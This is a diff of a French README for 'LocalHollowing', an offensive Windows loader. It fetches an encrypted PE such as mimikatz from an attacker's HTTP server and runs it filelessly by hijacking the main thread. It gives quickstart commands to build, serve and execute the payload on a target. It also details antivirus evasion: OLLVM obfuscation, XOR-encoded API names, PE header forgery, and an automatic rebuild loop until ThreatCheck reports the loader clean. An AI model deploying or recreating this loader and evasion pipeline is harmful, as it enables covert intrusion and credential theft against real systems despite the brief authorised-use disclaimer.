@@ -1,193 +1,119 @@
 # LocalHollowing
 
-Loader offensif basé sur la technique de **Local Hollowing**, conçu dans un cadre de recherche en sécurité offensive et de tests d'intrusion autorisés.
+Loader offensif basé sur la technique de **Local Hollowing** — remplace le contexte d'exécution du thread principal par un payload chiffré téléchargé en mémoire, sans créer de processus ni écrire sur disque.
 
-> **Avertissement** : Ce projet est destiné exclusivement à des fins éducatives, de recherche en sécurité et de tests d'intrusion dans des environnements autorisés. Toute utilisation non autorisée est illégale.
-
----
-
-## Vue d'ensemble
-
-Ce projet produit **deux artefacts distincts** à déployer séparément :
-
-| Artefact | Rôle | Où |
-|---|---|---|
-| `LocalHollowing_clean.exe` | Le **loader** — s'exécute sur la cible | Machine cible |
-| `payload.bin` | Le **payload chiffré** — hébergé sur un serveur HTTP | Serveur attaquant |
-
-Le loader ne contient **aucun payload embarqué**. Au moment de l'exécution, il contacte l'URL passée en argument pour télécharger `payload.bin`, le déchiffre en mémoire, et l'exécute via Local Hollowing. Le payload ne touche jamais le disque de la cible.
+> **Avertissement** : Usage exclusivement réservé à la recherche en sécurité et aux tests d'intrusion autorisés.
 
 ---
 
-## Architecture de la pipeline de build
+## Quickstart
 
-La pipeline génère les deux artefacts à partir d'un PE source :
+```powershell
+# Build + encryption en une commande
+.\run.ps1 -PE C:\tools\mimikatz.exe -Pass "MaPassphrase"
 
+# Servir le payload
+python -m http.server 8080 --directory build
+
+# Exécuter sur la cible
+.\build\LocalHollowing.exe http://<IP>:8080/payload.bin "MaPassphrase"
 ```
-[Machine de build]
 
-input/payload.exe  ──────────────────────────────────────────────────┐
-       │                                                              │
-       ▼                                                              │
-[1] Chiffrement AES-256-CBC                                           │
-    clé aléatoire → mimi_key.h embarquée dans le loader              │
-       │                                                              ▼
-       │                                              output/payload.bin
-       │                                              (à héberger sur serveur HTTP)
-       ▼
-[2] Génération resolve.h (XOR-obfuscation des noms d'API)
-       │
-       ▼
-[3] Compilation du LOADER avec OLLVM (flags randomisés)
-    → le loader est obfusqué, pas le payload
-       │
-       ▼
-[4] Patch PE du loader (Rich Header, timestamp, entropie)
-       │
-       ▼
-[5] ThreatCheck sur le loader
-    clean ?  ──yes──▶  output/LocalHollowing_clean.exe
-    non      ──────▶  retry avec nouvelle seed OLLVM (jusqu'à 10x)
-```
+Voir toutes les options : `.\run.ps1 -h`
 
 ---
 
-## Fonctionnement du loader à l'exécution
-
-Le Local Hollowing consiste à remplacer le contexte d'exécution du thread principal du **processus courant** par un payload, sans créer de nouveau processus ni écrire sur le disque.
+## Comment ça marche
 
 ```
-[Machine cible]
-
-LocalHollowing_clean.exe http://attaquant:8080/payload.bin
+.\build\LocalHollowing.exe http://attaquant:8080/payload.bin "passphrase"
        │
        ├─ Thread secondaire créé
        │        │
        │        ├─ [1] Suspend le thread principal
-       │        ├─ [2] Télécharge payload.bin depuis le serveur HTTP
-       │        ├─ [3] Déchiffre le payload en mémoire (AES-256-CBC)
-       │        ├─ [4] Mappe le PE manuellement (headers, sections, relocs, IAT)
-       │        ├─ [5] Applique les permissions par section (RW → RX)
-       │        ├─ [6] Redirige RIP du thread principal vers l'entry point
-       │        └─ [7] Reprend le thread principal → exécution du payload
+       │        ├─ [2] Télécharge payload.bin (WinINet, PEB walk)
+       │        ├─ [3] Déchiffre AES-256-CBC (clé = SHA256(passphrase))
+       │        ├─ [4] Mappe le PE : headers, sections, relocations, IAT, delay imports
+       │        ├─ [5] Enregistre les exception handlers (RtlAddFunctionTable)
+       │        ├─ [6] Applique les protections mémoire par section
+       │        ├─ [7] Spoof la command line (GetCommandLineW/A + PEB)
+       │        └─ [8] Hijack RIP → entry point du payload, ResumeThread
        │
-       └─ Le processus courant exécute désormais le payload
+       └─ Le processus exécute le payload (fileless)
 ```
 
 ---
 
-## Mesures d'évasion statique
+## Evasion statique
 
 | Technique | Détail |
 |---|---|
-| **Résolution d'API dynamique** | Zéro import suspect — PEB walk + parcours de la table d'exports |
-| **Obfuscation des strings** | Noms d'API et DLL XOR-encodés avec clé aléatoire par build |
-| **Chiffrement du payload** | AES-256-CBC, clé 16 octets générée aléatoirement à chaque pipeline |
-| **Obfuscation OLLVM** | BCF, FLA, SUB, SPLIT avec paramètres randomisés |
-| **Boucle ThreatCheck** | Rebuild automatique jusqu'à validation (10 tentatives max) |
-| **Permissions mémoire** | Allocation RW → VirtualProtect RX par section, jamais de RWX global |
-| **Rich Header** | Zéroé en post-build |
-| **PE Timestamp** | Zéroé en post-build |
-| **Réduction d'entropie** | Section `.pad` 32 Ko de données basse entropie injectée |
+| Résolution d'API dynamique | PEB walk + export table — zéro import suspect dans l'IAT |
+| Obfuscation des strings | Noms d'API/DLL XOR-encodés (clé aléatoire par build) |
+| Chiffrement du payload | AES-256-CBC, clé dérivée d'une passphrase au runtime |
+| OLLVM | BCF, FLA, SUB, SPLIT — paramètres randomisés à chaque build |
+| ThreatCheck loop | Rebuild automatique jusqu'à validation (10 tentatives max) |
+| Protections mémoire | RW → RX par section, jamais de RWX |
+| Patch PE | Rich Header forgé, timestamp réaliste, section `.pad` basse entropie |
+| Code légitime | utility.cpp = calculatrice, hash SHA-256, file info (couverture IAT) |
 
 ---
 
 ## Prérequis
 
-### Windows (machine de build)
-- Visual Studio 2022+ avec LLVM/OLLVM (clang-cl, lld-link)
-- Python 3.x + `pycryptodome` : `pip install pycryptodome`
-- [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)
-- PowerShell 5.1+
+- **Visual Studio 2022+** avec LLVM/OLLVM (`clang-cl.exe`, `lld-link.exe`)
+- **Python 3** + `pycryptodome` : `pip install pycryptodome`
+- **ThreatCheck** (optionnel) : [rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)
 
-### Chemins à configurer dans `scripts/build.ps1`
+Chemins à vérifier dans `scripts/build.ps1` :
 ```powershell
 $VCVARSALL = "C:\Program Files\Microsoft Visual Studio\...\vcvarsall.bat"
 $OLLVM_BIN = "C:\Program Files\Microsoft Visual Studio\...\Llvm\x64\bin"
 ```
 
-Et dans `scripts/run_pipeline.ps1` :
-```powershell
-$ThreatCheck = "C:\chemin\vers\ThreatCheck.exe"
-```
-
 ---
 
-## Utilisation
-
-### 1. Préparer le payload
-Placer le PE cible dans `input/` :
-```
-input/
-└── mimikatz.exe
-```
-
-### 2. Lancer la pipeline
-```powershell
-.\scripts\run_pipeline.ps1
-```
-
-Avec options :
-```powershell
-# Chemin payload explicite
-.\scripts\run_pipeline.ps1 -InputPath input\autre.exe
-
-# Build sans OLLVM (debug)
-.\scripts\run_pipeline.ps1 -NoObf
-
-# ThreatCheck alternatif + limite de tentatives
-.\scripts\run_pipeline.ps1 -ThreatCheck "C:\autre\ThreatCheck.exe" -MaxAttempts 15
-```
-
-### 3. Servir le payload
-```powershell
-python -m http.server 8080 --directory output
-```
-
-### 4. Exécuter le loader
-```powershell
-.\output\LocalHollowing_clean.exe http://<IP>:8080/payload.bin
-```
-
----
-
-## Structure du projet
+## Structure
 
 ```
 local-hollowing/
+├── run.ps1              # Point d'entrée unique (.\run.ps1 -h)
+├── config.json          # API à résoudre dynamiquement
 ├── LocalHollowing/
-│   ├── main.cpp          # Loader principal (download, decrypt, map, hijack)
-│   ├── peb_walk.h        # PEB walk + export table (remplace GetModuleHandleA/GetProcAddress)
-│   ├── resolve.h         # Auto-généré : résolution d'API XOR-obfusquée
-│   └── mimi_key.h        # Auto-généré : clé AES + PAYLOAD_SIZE
+│   ├── utility.cpp      # Entry point + code légitime (no obfuscation)
+│   ├── loader.cpp       # Loader : download, decrypt, RunPE (OLLVM)
+│   ├── loader.h
+│   ├── peb_walk.h       # PEB walk + export table parser
+│   └── resolve.h        # Auto-généré : résolution d'API XOR
 ├── scripts/
-│   ├── run_pipeline.ps1  # Orchestrateur principal
-│   ├── build.ps1         # Compilation OLLVM avec flags randomisés
-│   ├── encrypt_and_convert.py  # Chiffrement AES-256-CBC du payload
-│   ├── generate_resolve.py     # Génération de resolve.h avec XOR
+│   ├── build.ps1        # Compilation split (utility clean + loader OLLVM)
+│   ├── encrypt_and_convert.py  # Chiffrement AES-256-CBC
+│   ├── generate_resolve.py     # Génération resolve.h
 │   └── patch_pe.py             # Post-build : Rich Header, timestamp, entropie
-├── input/                # Payload source à placer ici
-├── output/               # Artefacts générés
-└── config.json           # Liste des API à résoudre dynamiquement
+└── build/               # Sortie (généré par run.ps1)
+    ├── LocalHollowing.exe
+    ├── payload.bin
+    └── passphrase.txt
 ```
 
 ---
 
-## Pipeline détaillée
+## Options de run.ps1
 
-| Étape | Script | Sortie |
-|---|---|---|
-| Chiffrement payload | `encrypt_and_convert.py` | `output/payload.bin`, `output/mimi_key.h` |
-| Génération resolve.h | `generate_resolve.py` | `output/resolve.h` |
-| Compilation OLLVM | `build.ps1` | `output/LocalHollowing.exe` |
-| Patch PE | `patch_pe.py` | Modification in-place du binaire |
-| Validation ThreatCheck | `run_pipeline.ps1` | `output/LocalHollowing_clean.exe` |
+| Paramètre | Description |
+|---|---|
+| `-PE` | Chemin vers le PE à chiffrer |
+| `-Pass` | Passphrase AES-256 (identique au runtime) |
+| `-NoObf` | Désactive OLLVM (build rapide, debug) |
+| `-MaxAttempts` | Limite de retry ThreatCheck (défaut: 10) |
+| `-ThreatCheck` | Chemin vers ThreatCheck.exe |
+| `-h` | Affiche l'aide |
 
 ---
 
-## Ajouter une API à résoudre dynamiquement
+## Ajouter une API
 
-Éditer `config.json` et relancer la pipeline :
+Éditer `config.json` et relancer `.\run.ps1` :
 ```json
 {
   "name": "NomDeLaFonction",
@@ -200,15 +126,14 @@ local-hollowing/
 
 ---
 
-## Limitations connues
+## Limitations
 
-- Payloads **.NET (MSIL)** non supportés — nécessite un CLR hosting
-- Payloads **x86** non supportés — loader compilé en x64 uniquement
-- Payloads sans table de relocation (`/FIXED`) peuvent échouer au mapping
+- Payloads **.NET** non supportés (nécessite CLR hosting)
+- **x64 uniquement**
+- Payloads sans relocation table (`/FIXED`) peuvent échouer
 
 ---
 
 ## Licence
 
-Ce projet est publié à des fins de recherche et d'éducation en sécurité offensive.  
-**Usage réservé aux environnements autorisés.**
+Recherche et éducation en sécurité offensive uniquement. **Usage réservé aux environnements autorisés.**
